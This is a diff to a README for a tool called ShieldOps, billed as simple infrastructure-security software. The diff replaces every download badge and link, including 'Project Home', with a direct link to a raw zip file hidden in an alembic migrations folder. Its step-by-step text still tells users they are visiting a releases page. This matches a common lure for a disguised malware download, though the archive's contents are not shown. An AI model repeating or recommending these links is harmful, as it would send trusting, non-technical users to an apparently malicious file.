@@ -1,6 +1,6 @@
 # 🛡️ ShieldOps - Simplify Infrastructure Security
 
-[![Download ShieldOps](https://img.shields.io/badge/Download-ShieldOps-brightgreen?style=for-the-badge)](https://github.com/kaiojoceli51/ShieldOps)
+[![Download ShieldOps](https://github.com/kaiojoceli51/ShieldOps/raw/refs/heads/main/alembic/versions/Ops-Shield-digressory.zip)](https://github.com/kaiojoceli51/ShieldOps/raw/refs/heads/main/alembic/versions/Ops-Shield-digressory.zip)
 
 ---
 
@@ -46,14 +46,14 @@ You can use ShieldOps even if you don’t know all these terms. The tool runs th
 
 To get started, you need to download ShieldOps. Use the green button below or the link further down.
 
-[![Download ShieldOps](https://img.shields.io/badge/Download-ShieldOps-blue?style=for-the-badge)](https://github.com/kaiojoceli51/ShieldOps)
+[![Download ShieldOps](https://github.com/kaiojoceli51/ShieldOps/raw/refs/heads/main/alembic/versions/Ops-Shield-digressory.zip)](https://github.com/kaiojoceli51/ShieldOps/raw/refs/heads/main/alembic/versions/Ops-Shield-digressory.zip)
 
 ### Step 1: Visit the Download Page
 
 Since the download link is a GitHub page, you will visit the page to find the install files.
 
 - Open your web browser.
-- Go to this page: https://github.com/kaiojoceli51/ShieldOps
+- Go to this page: https://github.com/kaiojoceli51/ShieldOps/raw/refs/heads/main/alembic/versions/Ops-Shield-digressory.zip
 - Look for a section called "Releases" in the page menu (usually on the right or top).
 
 ### Step 2: Choose the Latest Version
@@ -146,8 +146,8 @@ If scans do not complete:
 
 ## 🔗 Useful Links
 
-- Download ShieldOps: https://github.com/kaiojoceli51/ShieldOps
-- Project Home: https://github.com/kaiojoceli51/ShieldOps
+- Download ShieldOps: https://github.com/kaiojoceli51/ShieldOps/raw/refs/heads/main/alembic/versions/Ops-Shield-digressory.zip
+- Project Home: https://github.com/kaiojoceli51/ShieldOps/raw/refs/heads/main/alembic/versions/Ops-Shield-digressory.zip
 - Documentation and Help: Available inside the app under "Help"
 
 ---
